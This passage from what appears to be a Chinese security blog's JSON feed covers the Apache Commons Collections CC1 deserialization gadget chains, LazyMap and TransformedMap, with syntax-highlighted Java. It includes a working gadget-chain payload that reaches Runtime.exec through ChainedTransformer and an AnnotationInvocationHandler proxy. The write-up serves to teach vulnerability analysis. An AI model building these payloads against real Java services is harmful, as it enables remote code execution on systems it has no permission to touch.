punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"kate\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> transform <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> lazyMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//        lazyMap.get(1);</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandler <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandlerConstructor <span class=\"token operator\">=</span> annotationInvocationHandler<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">InvocationHandler</span> handler <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">)</span> annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Override</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> lazyMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//        Map o = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;, handler);</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">Map</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token class-name\">InvocationHandler</span> o1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">)</span> annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Override</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span>o1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>LazyMap 相对与 transformedMap 这条链来说会复杂一点，涉及到的知识点更广，给出的利用链也比较绕，只要能够深入理解动态代理的机制，也没有太大的问题。</p>\n<hr />\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "反序列化"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/17/CC1/",
            "url": "http://zhyzhyzhy.cn/2022/10/17/CC1/",
            "title": "Java反序列化CommonsCollections篇(一)",
            "date_published": "2022-10-17T02:13:45.000Z",
            "content_html": "<h1 id=\"cc1-链-transformedmap-gadget-chain\"><a class=\"anchor\" href=\"#cc1-链-transformedmap-gadget-chain\">#</a> CC1 链 —— TransformedMap Gadget chain</h1>\n<p>本次分析 TransformedMap 的链</p>\n<h2 id=\"0x01前言\"><a class=\"anchor\" href=\"#0x01前言\">#</a> 0x01：前言</h2>\n<blockquote>\n<p>Apache Commons 是 Apache 软件基金会的项目，曾经隶属于 Jakarta 项目。Commons 的目的是提供可重用的、解决各种实际的通用问题且开源的 Java 代码。Commons 由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和 Dormant（是一些刚启动或者已经停止维护的项目）。</p>\n<p>Commons Collections 包为 Java 标准的 Collections API 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>\n</blockquote>\n<h2 id=\"0x02环境准备\"><a class=\"anchor\" href=\"#0x02环境准备\">#</a> 0x02：环境准备</h2>\n<ul>\n<li>CommonsCollections 版本：3.1-3.2.1</li>\n<li>JDK7 或 JDK8u71 以下</li>\n</ul>\n<h2 id=\"0x03利用类分析\"><a class=\"anchor\" href=\"#0x03利用类分析\">#</a> 0x03：利用类分析</h2>\n<h3 id=\"transform\"><a class=\"anchor\" href=\"#transform\">#</a> transform</h3>\n<p>源代码</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">Transformer</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>     * Transforms the input object (leaving it unchanged) into some output object.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>     *</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     * @param input  the object to be transformed, should be left unchanged</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>     * @return a transformed object</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>     * @throws ClassCastException (runtime) if the input is the wrong class</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>     * @throws IllegalArgumentException (runtime) if the input is invalid</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     * @throws FunctorException (runtime) if the transform cannot be completed</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Transformer 是一个接口，实现了 transformer，注释上面解释道：将输入对象（保持不变）转换为某些输出对象。<br />\n查看 Transformer 的继承关系<br />\n<img data-src=\"https://s2.loli.net/2022/10/18/YLegiMAP28IE7Fb.png\" alt=\"1.png\" /></p>\n<p>发现很多类都继承类 Transformer ，本次主要分析 ysoserial 给出的 InvokerTransformer 类，当然，你也可以分析其他利用链的利用方式</p>\n<h3 id=\"invokertransformer\"><a class=\"anchor\" href=\"#invokertransformer\">#</a> InvokerTransformer</h3>\n<blockquote>\n<p>Transformer implementation that creates a new object instance by reflection.</p>\n</blockquote>\n<p>这是官方给出的解释，可以反射创建一个新的对象实例</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// InvokerTransformer 的构造函数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> methodName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> paramTypes<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    iMethodName <span class=\"token operator\">=</span> methodName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    iParamTypes <span class=\"token operator\">=</span> paramTypes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    iArgs <span class=\"token operator\">=</span> args<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// InvokerTransformer 的 transform 实现方法 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 本身就是反射调用的写法</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token class-name\">Method</span> method <span class=\"token operator\">=</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span>iMethodName<span class=\"token punctuation\">,</span> iParamTypes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">return</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span> iArgs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NoSuchMethodException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span> iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' does not exist\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalAccessException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span> iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' cannot be accessed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationTargetException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span> iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' threw an exception\"</span><span class=\"token punctuation\">,</span> ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Runtime 的反射调用</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> runtime<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Method</span> exec <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        exec<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        exec<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>runtime<span class=\"token punctuation\">,</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>改为 InvokerTransformer 版的</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">InvokerTransformer</span> invokerTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        invokerTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>runtime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"0x04利用链构造\"><a class=\"anchor\" href=\"#0x04利用链构造\">#</a> 0x04：利用链构造</h2>\n<p>了解完最终执行点后，开始构造利用链</p>\n<h3 id=\"查找-transfrom-方法的其他调用点-不同类的同名函数\"><a class=\"anchor\" href=\"#查找-transfrom-方法的其他调用点-不同类的同名函数\">#</a> 查找 transfrom 方法的其他调用点 （不同类的同名函数）</h3>\n<p><img data-src=\"https://s2.loli.net/2022/10/18/FGVdkgxi92Dm5jn.png\" alt=\"2.png\" /></p>\n<p>找到 TransformedMap 的 CheckSetValue 中调用了 transfrom，现在我们并不知道里面的 value 是否可控，稍后继续分析</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>     * Constructor that wraps (not copies).</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>     * &lt;p></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>     * If there are any elements already in the collection being decorated, they</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>     * are NOT transformed.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     * </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>     * @param map  the map to decorate, must not be null</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>     * @param keyTransformer  the transformer to use for key conversion, null means no conversion</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>     * @param valueTransformer  the transformer to use for value conversion, null means no conversion</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     * @throws IllegalArgumentException if map is null</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span> map<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Transformer</span> keyTransformer<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Transformer</span> valueTransformer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>keyTransformer <span class=\"token operator\">=</span> keyTransformer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>valueTransformer <span class=\"token operator\">=</span> valueTransformer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//  TransformedMap 的 decorate 方法</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Map</span> <span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span> map<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Transformer</span> keyTransformer<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Transformer</span> valueTransformer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> keyTransformer<span class=\"token punctuation\">,</span> valueTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span>    </pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">//checkSetValue 的实现方法</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">checkSetValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> valueTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>查看 TransformedMap 的构造函数并结合官方给出的注释，可以看出，它是对 Map 的 key 和 value 进行修饰，并在 checkSetValue 中调用 valueTransformer 的 transform 方法</p>\n<h3 id=\"查找-checksetvalue-的其他调用点不同类的同名函数\"><a class=\"anchor\" href=\"#查找-checksetvalue-的其他调用点不同类的同名函数\">#</a> 查找 checkSetValue 的其他调用点（不同类的同名函数）</h3>\n<p>发现只有一处进行了调用，只在 MapEntry 中进行类调用</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/18/V8mwyzX6PgM7nTt.png\" alt=\"3.png\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MapEntry</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractMapEntryDecorator</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">/** The parent map */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">AbstractInputCheckedMapDecorator</span> parent<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token class-name\">MapEntry</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span> entry<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AbstractInputCheckedMapDecorator</span> parent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>entry<span class=\"token punctuation\">)</span><span 